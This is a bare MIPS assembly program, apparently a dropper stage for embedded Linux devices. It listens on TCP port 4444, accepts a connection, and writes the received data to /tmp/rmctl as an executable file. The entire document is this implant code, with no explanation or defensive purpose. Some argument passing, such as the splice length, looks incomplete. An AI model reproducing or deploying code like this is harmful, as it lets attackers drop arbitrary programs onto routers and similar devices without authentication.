    .set noreorder
    .data
dstname:  .asciiz  "/tmp/rmctl"

    .text
    .globl __start

__start:
    addi $sp, $sp, -64

    # struct sockaddr_in
    li   $t0, 2
    sh   $t0, 40($sp)

    li   $t0, 4444
    sh   $t0, 42($sp)

    li   $t0, 0
    sw   $t0, 44($sp)
    sw   $t0, 48($sp)
    sw   $t0, 52($sp)

    # pipe(pipes);
    li   $v0, 4328
    la   $a0, 56($sp)
    li   $a1, 0
    li   $a2, 0
    syscall

    bnez $v0, error
    
    la   $s2, 56($sp)
    lw   $s1, 4($s2)
    lw   $s2, 0($s2)

    # socket(AF_INET=2, SOCK_STREAM=2, 0);
    li   $v0, 4183
    li   $a0, 2
    li   $a1, 2
    li   $a2, 0
    syscall

    ble  $v0, -1, error

    sw   $v0, 24($sp)

    # bind(sfd, &safm, addrlen);
    li   $v0, 4169
    lw   $a0, 24($sp)
    la   $a1, 40($sp)
    li   $a2, 16
    syscall

    bnez  $v0, error

    # listen(sfd, 1);
    li   $v0, 4174
    lw   $a0, 24($sp)
    li   $a1, 1
    syscall

    bnez  $v0, error

    # accept(sfd, claddr, clalen);
    li   $v0, 4168
    lw   $a0, 24($sp)
    la   $a1, 64($sp)
    la   $a2, 60($sp)
    syscall

    ble  $v0, -1, error

    sw   $v0, 28($sp)

    # open(dstname, flags, mode);
    li   $v0, 4005
    la   $a0, dstname
    li   $a1, 0x101
    li   $a2, 0x1ED
    syscall
    ble  $v0, -1, error

    sw   $v0, 32($sp)

    # read(cfd, size, 4);
    li   $v0, 4003
    lw   $a0, 28($sp)
    la   $a1, 16($sp)
    li   $a2, 4
    syscall

    li   $t0, 0
    sw   $t0, 20($sp)

    # splice(cfd, NULL, pipe[0], NULL, size, 0)
    li   $v0, 4304
    lw   $a0, 28($sp)
    li   $a1, 0
    move $a2, $s1
    li   $a3, 0
    syscall    

    # splice(pipe[1], NULL, dst, NULL, size, 0)
    li   $v0, 4304
    move $a0, $s2
    li   $a1, 0
    lw   $a2, 32($sp)
    li   $a3, 0
    syscall


    # close(dst);
    li   $v0, 4006
    lw   $a0, 32($sp)
    syscall

    # close(cfd);
    li   $v0, 4006
    lw   $a0, 28($sp)
    syscall

    bnez  $v0, error

    # close(sfd);
    li   $v0, 4006
    lw   $a0, 24($sp)
    syscall

    bnez  $v0, error

    addi $sp, $sp, 64

    li   $v0, 0

error:
    move $a0, $v0
    li   $v0, 4001
    syscall